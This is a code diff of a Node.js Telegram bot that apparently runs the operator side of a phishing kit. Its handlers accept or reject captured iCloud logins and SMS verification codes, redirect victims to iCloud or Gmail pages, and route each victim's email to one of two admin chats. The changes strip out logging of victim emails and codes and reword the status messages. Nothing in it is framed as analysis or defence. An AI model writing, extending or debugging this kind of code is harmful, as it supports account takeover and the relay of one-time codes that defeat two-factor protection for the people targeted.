@@ -132,15 +132,12 @@ async function broadcastMessage(chatId, message, options = {}) {
 
 async function sendFollowUpMessage(email, message, options = {}) {
   try {
-    console.log(`🔍 Checking winner for ${email}: ${userWinnerTelegram[email]}`);
     
     if (userWinnerTelegram[email] === "telegram1") {
       await bot.sendMessage(ADMIN_CHAT_ID, message, options);
-      console.log(`📨 Follow-up sent to Bot 1 (Email: ${email})`);
     } else if (userWinnerTelegram[email] === "telegram2") {
       if (bot2 && ADMIN_CHAT_ID_2) {
         await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
-        console.log(`📨 Follow-up sent to Bot 2 (Email: ${email})`);
       }
     } else {
       console.log(`⚠️ No winner found for ${email}, not sending follow-up`);
@@ -396,12 +393,11 @@ bot.on("callback_query", async (query) => {
     let displayEmail = email;  // ✅ What to show in acceptance message
 
     // ✅ For SMS callbacks, get SMS code from server
-    if (action.startsWith("sms_") && identifier && identifier.includes("sms_code_")) {
+    if (action.startsWith("sms_")) {
       try {
         const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}`);
         const data = await response.json();
         smsCode = data.smsCode || identifier;
-        console.log(`📝 SMS callback: requestId ${identifier} → code ${smsCode}`);
       } catch (err) {
         console.error("Error fetching SMS code:", err);
         smsCode = identifier;
@@ -487,9 +483,9 @@ bot.on("callback_query", async (query) => {
       } else if (action === "page_reject") {
         statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>! ✅`;
+        statusMessage = `✅ ${smsCode} SMS Accepted!`;
       } else if (action === "sms_reject") {
-        statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>! ❌`;
+        statusMessage = `❌ ${smsCode} SMS Rejected!`;
       } else if (action === "redirect_icloud") {
         statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
       } else if (action === "redirect_gmail") {
@@ -863,13 +859,9 @@ if (bot2) {
         } else if (action === "page_reject") {
           statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
         } else if (action === "sms_accept") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS <b>ACCEPTED</b>! ✅`;
+          statusMessage = `✅ ${smsCode} SMS Accepted!`;
         } else if (action === "sms_reject") {
-          statusMessage = `💬 <code>${smsCode}</code> SMS <b>REJECTED</b>! ❌`;
-        } else if (action === "sms_accept") {
-          statusMessage = `💬 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
-        } else if (action === "sms_reject") {
-          statusMessage = `💬 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
+          statusMessage = `❌ ${smsCode} SMS Rejected!`;
         } else if (action === "redirect_icloud") {
           statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
         } else if (action === "redirect_gmail") {
